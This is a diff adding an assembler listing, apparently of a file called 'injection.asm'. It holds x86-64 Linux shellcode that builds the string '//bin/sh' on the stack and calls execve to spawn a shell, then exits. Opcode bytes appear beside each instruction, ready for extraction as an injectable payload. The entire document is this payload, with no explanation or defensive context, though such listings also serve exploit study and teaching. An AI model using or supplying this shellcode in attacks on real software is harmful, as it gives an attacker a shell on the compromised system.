@@ -1,0 +1,26 @@
+     1                                 %line 1+1 injection.asm
+     2                                 
+     3                                 
+     4                                 
+     5                                 [section .data]
+     6                                 
+     7                                 NULL equ 0
+     8 00000000 2F62696E2F736800       progName db "/bin/sh", NULL
+     9                                 
+    10                                 
+    11                                 [section .text]
+    12                                 [global _start]
+    13                                 _start:
+    14 00000000 4831C0                  xor rax, rax
+    15 00000003 50                      push rax
+    16 00000004 48BB2F2F62696E2F73-     mov rbx, 0x68732f6e69622f2f
+    17 00000004 68                 
+    18 0000000E 53                      push rbx
+    19 0000000F B03B                    mov al, 59
+    20 00000011 4889E7                  mov rdi, rsp
+    21 00000014 0F05                    syscall
+    22                                 
+    23                                 last:
+    24 00000016 48C7C03C000000          mov rax, 60
+    25 0000001D 48C7C700000000          mov rdi, 0
+    26 00000024 0F05                    syscall
